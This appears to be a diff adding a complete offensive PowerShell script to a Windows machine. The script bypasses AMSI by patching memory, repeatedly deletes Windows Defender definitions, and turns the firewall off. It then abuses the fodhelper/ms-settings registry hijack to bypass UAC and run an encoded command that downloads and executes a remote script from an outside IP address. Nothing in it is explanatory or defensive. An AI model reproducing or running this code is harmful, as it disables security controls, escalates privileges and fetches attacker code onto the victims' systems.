@@ -1,0 +1,22 @@
+$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like '*Context') {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+start-process powershell.exe -argumentlist "while(1){& 'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All;start-sleep -seconds 300}" -windowstyle hidden
+
+& 'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All
+netsh advfirewall set allprofiles state off
+$Command = "c:\windows\tasks\Gardeningozhuntington.exe -Win hidden -nonI -noP -Exe ByPass -ENC JAB3AGMAIAA9ACAAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkAOwAkAHcAYwAuAGgAZQBhAGQAZQByAHMALgBhAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAAxADAALgAwADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwApADsAaQBlAHgAKAAkAHcAYwAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAzADUALgA3AC8AcgB1AG4ALgB0AHgAdAAnACkAKQA="
+function Setz {
+    copy c:\windows\system32\windowspowershell\v1.0\powershell.exe c:\windows\tasks\Gardeningozhuntington.exe
+    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
+    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $Command -Force
+}
+
+function Boomz {
+    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+    Start-Sleep -s 5
+    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
+}
+Setz
+Boomz
